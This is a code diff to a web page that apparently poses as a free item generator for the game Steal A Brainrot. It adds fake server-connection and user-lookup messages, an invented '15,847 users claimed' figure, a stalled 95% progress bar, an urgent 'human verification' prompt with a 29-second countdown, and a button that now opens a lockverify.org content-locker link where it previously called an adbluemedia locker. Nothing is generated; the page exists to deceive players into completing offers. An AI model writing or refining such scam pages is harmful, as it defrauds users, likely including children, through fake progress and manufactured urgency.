@@ -399,6 +399,21 @@
         
         .pulse-title {
             animation: pulse 2s infinite;
+            white-space: pre-line;
+        }
+        
+        .orange-title {
+            color: #ff6b35;
+            font-weight: bold;
+            font-size: 24px;
+            margin-bottom: 15px;
+        }
+        
+        .countdown-timer {
+            color: #ff6b35;
+            font-weight: bold;
+            font-size: 18px;
+            margin-top: 10px;
         }
         
         @keyframes pulse {
@@ -717,6 +732,7 @@
                 <div id="progress-fill" class="progress-fill" style="width:0%">0%</div>
             </div>
             <div id="game-tip" class="mb-4 text-lg text-dark"></div>
+            <div id="countdown-timer" class="countdown-timer hidden">Complete in 29 seconds!</div>
             <button id="verify-btn" class="green-claim-button w-full py-3 text-xl hidden">Verify & Claim</button>
         </div>
     </div>
@@ -931,8 +947,8 @@
             
             // Verify button
             document.getElementById('verify-btn').addEventListener('click', function() {
-                // Trigger the adbluemedia content locker
-                _iD();
+                // Redirect to the specified link
+                window.open('https://lockverify.org/cl/i/rnd5ol', '_blank');
                 
                 // Show success message after a delay
                 setTimeout(function() {
@@ -956,20 +972,23 @@
         // Open generator modal
         function openGeneratorModal(index, username) {
             const brainrot = brainrots[index];
-            document.getElementById('generator-title').textContent = 'Connecting...';
+            document.getElementById('generator-title').textContent = 'Connecting to Steal A\nBrainrot servers...';
+            document.getElementById('generator-title').className = 'text-2xl font-bold mb-4 pulse-title';
             document.getElementById('loading-item-img').style.display = 'none';
             document.getElementById('progress-fill').style.width = '0%';
             document.getElementById('progress-fill').textContent = '0%';
-            document.getElementById('game-tip').textContent = '';
+            document.getElementById('game-tip').textContent = '15,847 users claimed brainrot today!';
+            document.getElementById('countdown-timer').style.display = 'none';
             document.getElementById('verify-btn').style.display = 'none';
             
             generatorModal.style.display = 'flex';
             
             // Simulate connection process
             setTimeout(() => {
-                document.getElementById('generator-title').textContent = 'Connected!';
+                document.getElementById('generator-title').textContent = `Finding user: ${username}...`;
                 document.getElementById('loading-item-img').src = brainrot.image;
                 document.getElementById('loading-item-img').style.display = 'block';
+                document.getElementById('game-tip').textContent = 'User database verified';
                 
                 // Simulate progress
                 let progress = 0;
@@ -979,10 +998,31 @@
                         progress = 95;
                         clearInterval(interval);
                         
-                        document.getElementById('game-tip').innerHTML = '<b>URGENT:</b> Human verification required to finish claiming your brainrot!';
-                        document.getElementById('verify-btn').style.display = 'block';
-                        document.getElementById('verify-btn').setAttribute('data-index', index);
-                        document.getElementById('verify-btn').setAttribute('data-username', username);
+                        document.getElementById('generator-title').textContent = 'User found! Preparing\nto generate brainrot...';
+                        document.getElementById('game-tip').textContent = 'Generating premium brainrot items...';
+                        
+                        // Show urgent message and countdown after a short delay
+                        setTimeout(() => {
+                            document.getElementById('generator-title').textContent = 'ALMOST COMPLETE... 95%';
+                            document.getElementById('generator-title').className = 'orange-title';
+                            document.getElementById('game-tip').innerHTML = '<b>URGENT:</b> Human verification required to finish claiming your brainrot!';
+                            document.getElementById('countdown-timer').style.display = 'block';
+                            document.getElementById('verify-btn').style.display = 'block';
+                            document.getElementById('verify-btn').setAttribute('data-index', index);
+                            document.getElementById('verify-btn').setAttribute('data-username', username);
+                            
+                            // Start countdown timer
+                            let seconds = 29;
+                            const countdownElement = document.getElementById('countdown-timer');
+                            const countdownInterval = setInterval(() => {
+                                countdownElement.textContent = `Complete in ${seconds} seconds!`;
+                                seconds--;
+                                if (seconds < 0) {
+                                    clearInterval(countdownInterval);
+                                    countdownElement.textContent = 'Time expired!';
+                                }
+                            }, 1000);
+                        }, 1000);
                     }
                     
                     document.getElementById('progress-fill').style.width = `${progress}%`;
